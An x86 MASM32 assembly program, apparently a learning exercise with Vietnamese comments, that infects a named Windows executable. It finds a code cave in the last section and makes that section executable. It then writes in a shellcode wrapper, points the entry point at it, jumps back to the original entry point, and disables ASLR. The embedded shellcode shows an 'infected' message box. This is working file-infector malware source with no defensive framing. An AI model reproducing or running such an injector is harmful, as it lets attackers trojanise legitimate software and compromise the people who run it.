.386
.model flat, stdcall
option casemap:none

include windows.inc
include kernel32.inc
include user32.inc

includelib kernel32.lib
includelib user32.lib

.data
    targetFileName      db "Radmin_VPN_1.4.4642.1.exe",0
    msgInject           db "Start inject into: ",0
    msgNotPE32Text      db "Error: Not a PE32 executable.",0
    msgNotPE32Title     db "Error",0
    msgOldOEPTitle      db "Orginal AddressOfEntryPoint: ",0
    msgNewOEPTitle      db "New AddressOfEntryPoint: ",0
    msgFirstSectionTitle  db "FirstSectionHeader @",0
    msgCaveFailText     db "Error: No code cave found!",0
    msgCaveFailTitle    db "Error",0
    msgSuccessText      db "Successfully injected!",0
    msgSuccessTitle     db "OK",0
    msgSectionTitle     db "Injecting into section:",0
    sectionNameBuf      db 9 dup(0)
    sectionNameBufOEP   db 9 dup(0)
    fmtOEP              db "%08X",0
    fmtAddr             db "Section VA=0x%08X",0
    addrBuf               db 16 dup(0)
    
    ; Shellcode bytes
    shellcode db 0D9h,0EBh,09Bh,0D9h,074h,024h,0F4h,031h,0D2h,0B2h,077h,031h,0C9h,064h
             db 08Bh,071h,030h,08Bh,076h,00Ch,08Bh,076h,01Ch,08Bh,046h,008h,08Bh,07Eh,020h
             db 08Bh,036h,038h,04Fh,018h,075h,0F3h,059h,001h,0D1h,0FFh,0E1h,060h,08Bh,06Ch
             db 024h,024h,08Bh,045h,03Ch,08Bh,054h,028h,078h,001h,0EAh,08Bh,04Ah,018h,08Bh
             db 05Ah,020h,001h,0EBh,0E3h,034h,049h,08Bh,034h,08Bh,001h,0EEh,031h,0FFh,031h
             db 0C0h,0FCh,0ACh,084h,0C0h,074h,007h,0C1h,0CFh,00Dh,001h,0C7h,0EBh,0F4h,03Bh
             db 07Ch,024h,028h,075h,0E1h,08Bh,05Ah,024h,001h,0EBh,066h,08Bh,00Ch,04Bh,08Bh
             db 05Ah,01Ch,001h,0EBh,08Bh,004h,08Bh,001h,0E8h,089h,044h,024h,01Ch,061h,0C3h
             db 0B2h,008h,029h,0D4h,089h,0E5h,089h,0C2h,068h,08Eh,04Eh,00Eh,0ECh,052h,0E8h
             db 09Fh,0FFh,0FFh,0FFh,089h,045h,004h,0BBh,07Eh,0D8h,0E2h,073h,087h,01Ch,024h
             db 052h,0E8h,08Eh,0FFh,0FFh,0FFh,089h,045h,008h,068h,06Ch,06Ch,020h,041h,068h
             db 033h,032h,02Eh,064h,068h,075h,073h,065h,072h,030h,0DBh,088h,05Ch,024h,00Ah
             db 089h,0E6h,056h,0FFh,055h,004h,089h,0C2h,050h,0BBh,0A8h,0A2h,04Dh,0BCh,087h
             db 01Ch,024h,052h,0E8h,05Fh,0FFh,0FFh,0FFh,068h,074h,058h,020h,020h,068h,041h
             db 06Ch,065h,072h,031h,0DBh,088h,05Ch,024h,005h,089h,0E3h,068h,065h,064h,021h
             db 058h,068h,066h,065h,063h,074h,068h,06Eh,020h,069h,06Eh,068h,020h,062h,065h
             db 065h,068h,068h,061h,076h,065h,068h,059h,06Fh,075h,020h,031h,0C9h,088h,04Ch
             db 024h,017h,089h,0E1h,031h,0D2h,06Ah,010h,053h,051h,052h,0FFh,0D0h
    shellcodeSize equ ($ - shellcode)
    wrapperSize   equ shellcodeSize + 11  ; 4 NOP + 1 PUSHAD + shellcode + 1 POPAD + 5 JMP

.data?
    hFile         dd ?
    hMap          dd ?
    pMap          dd ?
    oldOEP        dd ?  ; RVA of original entry point
    sectionRaw    dd ?  ; PointerToRawData of .text
    sectionVA     dd ?  ; VirtualAddress of .text
    sectionSize   dd ?  ; SizeOfRawData of .text
    caveOffset    dd ?  ; raw file-offset of code cave

.code
start:
    invoke MessageBoxA, 0, addr targetFileName, addr msgInject, MB_OK
    jmp mapping

mapping:
    ;--- Open and map file
    invoke CreateFileA, addr targetFileName, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov hFile, eax
    cmp eax, INVALID_HANDLE_VALUE
    je exit

    invoke CreateFileMappingA, hFile, NULL, PAGE_READWRITE, 0,0, NULL
    mov hMap, eax
    invoke MapViewOfFile, hMap, FILE_MAP_WRITE, 0,0,0
    mov pMap, eax

    ;--- Validate PE32
    mov   ebx, pMap                ; EBX = base của file mapping
    mov   eax, [ebx + 3Ch]         ; eax = e_lfanew
    add   ebx, eax                 ; EBX -> IMAGE_NT_HEADERS
    mov   cx, word ptr [ebx + 18h] ; cx = OptionalHeader.Magic
    cmp   cx, 010Bh                ; 0x10B = PE32, 0x20B = PE32+
    jne   not_pe32

    ;--- Save old OEP RVA  
    mov eax, pMap           ; eax = giá trị của pMap (địa chỉ base của file mapping)
    mov eax, dword ptr [eax + 3Ch]   ; eax = *((BYTE*)pMap + 0x3C) => e_lfanew
    add eax, pMap           ; eax = pMap + e_lfanew = &IMAGE_NT_HEADERS                      ; eax = &IMAGE_NT_HEADERS
    mov ebx, dword ptr [eax + 28h]     ; ebx = OptionalHeader.AddressOfEntryPoint (RVA)
    mov oldOEP, ebx                    ; store old EntryPoint RVA
    mov ebx, dword ptr [eax + 28h]    ; ebx = OptionalHeader.AddressOfEntryPoint (RVA)
    mov oldOEP, ebx                    ; store old EntryPoint RVA

    ;--- Debug: print oldOEP in hex immediately
    ;push oldOEP                      ; value to format
    ;push offset fmtOEP               ; format string "%08X"
    ;push offset sectionNameBufOEP    ; destination buffer
    ;call wsprintfA                   ; write hex into buffer
    ;invoke MessageBoxA, 0, addr sectionNameBufOEP, addr msgOldOEPTitle, MB_OK

    ;--- Locate & read last section header ---
    ;=== Lấy base address của mapping ===
    mov     ebx, pMap             ; EBX = base của file mapping

    ;=== Tính con trỏ tới IMAGE_NT_HEADERS ===
    mov     eax, [ebx + 3Ch]         ; eax = e_lfanew
    add     eax, ebx                 ; eax = &IMAGE_NT_HEADERS

    ;=== Lấy số section và kích thước OptionalHeader ===
    movzx   ecx, word ptr [eax + 6]  ; ECX = NumberOfSections
    dec     ecx                      ; index của section cuối (0-based)
    movzx   edx, word ptr [eax + 14h]; EDX = SizeOfOptionalHeader

    ;=== Tìm địa chỉ section đầu tiên ===
    lea     esi, [eax + 18h]         ; skip Signature(4) + FILE_HEADER(20)
    add     esi, edx                 ; ESI = &FirstSectionHeader

    ;--- Debug: in ra &FirstSectionHeader ---
    ; ESI đang chứa &FirstSectionHeader
    ;push    esi                     ; giá trị muốn format (pointer)
    ;mov     eax, dword ptr [esi + 0Ch]
    ;push    eax
    ;push    offset fmtAddr         ; định dạng "%08X"
    ;push    offset addrBuf         ; buffer để wsprintfA ghi kết quả
    ;call    wsprintfA
    ;invoke  MessageBoxA, 0, addr addrBuf, addr msgFirstSectionTitle, MB_OK

    ;=== Nhảy tới last section header ===
    ;mov     ecx, 7
    imul    ecx, ecx, 40             ; ECX = index * sizeof(IMAGE_SECTION_HEADER)
    add     esi, ecx                 ; ESI = &LastSectionHeader

    ;=== Đọc PointerToRawData, VirtualAddress, SizeOfRawData ===
    mov     ebx, esi
    mov     eax, [ebx + 14h]         ; PointerToRawData
    mov     sectionRaw, eax
    mov     eax, [ebx + 0Ch]         ; VirtualAddress
    mov     sectionVA,  eax
    mov     eax, [ebx + 10h]         ; SizeOfRawData
    mov     sectionSize, eax

    ;=== Bật flag EXECUTE cho section này ===
    mov     edx, [esi + 24h]        ; đọc Characteristics cũ
    or      edx, 0E0000020h 
    mov     [esi + 24h], edx        ; ghi lại vào header

    ;=== DEBUG: in ra sectionVA dưới dạng hex ===
    invoke  wsprintfA, addr addrBuf, addr fmtAddr, sectionVA
    invoke  MessageBoxA, 0, addr addrBuf, addr msgSectionTitle, MB_OK

    ;--- Search for code cave in last section
    mov ebx, pMap                     ; EBX = base of file mapping
    add ebx, sectionRaw               ; EBX = base of section raw data
    xor ecx, ecx                      ; ECX = offset within section                     ; ECX = offset within section

find_cave:
    cmp ecx, sectionSize
    jae cave_fail
    mov al, byte ptr [ebx + ecx]
    cmp al, 0
    jne next_byte
    mov edi, ecx                     ; EDI = start offset
    xor edx, edx                     ; EDX = zero count

count_zeros:
    mov al, byte ptr [ebx + edi]
    cmp al, 0
    jne next_byte
    inc edx
    inc edi
    cmp edx, wrapperSize
    jb count_zeros
    mov caveOffset, ecx
    jmp inject_shellcode

next_byte:
    inc ecx
    jmp find_cave

cave_fail:
    invoke MessageBoxA, 0, addr msgCaveFailText, addr msgCaveFailTitle, MB_OK
    jmp exit

not_pe32:
    invoke MessageBoxA, 0, addr msgNotPE32Text, addr msgNotPE32Title, MB_OK
    jmp exit

inject_shellcode:
    ;mov edi, ebx                     ; EDI = base of .text raw
    ;add edi, caveOffset              ; EDI = start address of wrapper
    lea edi, [ebx + caveOffset]      ; EDI = start address of wrapper

    ; 1) 4 NOPs
    mov ecx, 4
    mov al, 90h
    rep stosb

    ; 2) PUSHAD
    mov byte ptr [edi], 60h
    inc edi

    ; 3) Shellcode
    lea esi, shellcode
    mov ecx, shellcodeSize
    rep movsb

    ; 4) POPAD
    mov byte ptr [edi], 61h
    inc edi

    ; 5) JMP back to old OEP
    mov eax, oldOEP
    mov ebx, sectionVA
    add ebx, caveOffset
    add ebx, wrapperSize
    sub eax, ebx                     ; rel32
    mov byte ptr [edi], 0E9h
    inc edi
    mov dword ptr [edi], eax
    add edi, 4

    ;--- Patch EntryPoint to cave RVA
    ;mov eax, dword ptr [pMap + 3Ch]
    ;add eax, pMap
    ;add eax, 28h                     ; &OptionalHeader.AddressOfEntryPoint
    ;mov ebx, sectionVA
    ;add ebx, caveOffset             ; rvaCave
    ;mov dword ptr [eax], ebx

    ;--- Patch EntryPoint to cave RVA
    ; 1) Lấy base của mapping vào eax
    mov   eax, [pMap]           ; lấy giá trị pMap (base của file mapping)
    ; 2) Đọc e_lfanew
    mov   ecx, [eax + 3Ch]      ; ecx = e_lfanew
    ; 3) Tính địa chỉ IMAGE_NT_HEADERS
    add   eax, ecx              ; eax -> IMAGE_NT_HEADERS
    ; 4) Tính &OptionalHeader.AddressOfEntryPoint = NT_HEADERS + 0x18 + 0x10 = +0x28
    lea   edi, [eax + 28h]      ; edi -> OptionalHeader.AddressOfEntryPoint
    ; 5) Tính rva của shellcode (cave RVA)
    mov   ebx, sectionVA
    add   ebx, caveOffset       ; ebx = rvaCave
    ; 6) Ghi xuống file
    mov   [edi], ebx            ; OptionalHeader.AddressOfEntryPoint = rvaCave

    ;--- DEBUG: in ra AddressOfEntryPoint mới
    ; copy giá trị mới vào EAX
    mov   eax, [edi]            ; eax = new RVA
    ;format hex vào addrBuf
    invoke wsprintfA, addr addrBuf, addr fmtOEP, eax
    ;show MessageBox
    invoke MessageBoxA, 0, addr addrBuf, addr msgNewOEPTitle, MB_OK

    ;=== Disable ASLR: clear IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE (0x0040) ===
    mov   ebx, pMap                ; EBX = base của file mapping
    mov   ecx, [ebx + 3Ch]         ; ECX = e_lfanew
    add   ebx, ecx                 ; EBX -> IMAGE_NT_HEADERS
    lea   edi, [ebx + 5Eh]         ; EDI -> OptionalHeader.DllCharacteristics
    mov   ax, word ptr [edi]       ; load current DllCharacteristics
    and   ax, 0FFBFh               ; clear bit 0x0040 (dynamic base)
    mov   word ptr [edi], ax       ; write back

    ;--- Debug: in ra DllCharacteristics mới
    ;invoke wsprintfA, addr addrBuf, addr fmtOEP, ax
    ;invoke MessageBoxA, 0, addr addrBuf, addr msgSectionTitle, MB_OK

    ;--- Flush and cleanup
    invoke FlushViewOfFile, pMap, 0
    invoke UnmapViewOfFile, pMap
    invoke FlushFileBuffers, hFile
    invoke CloseHandle, hMap
    invoke CloseHandle, hFile
    invoke MessageBoxA, 0, addr msgSuccessText, addr msgSuccessTitle, MB_OK


exit:
    invoke ExitProcess, 0
end start
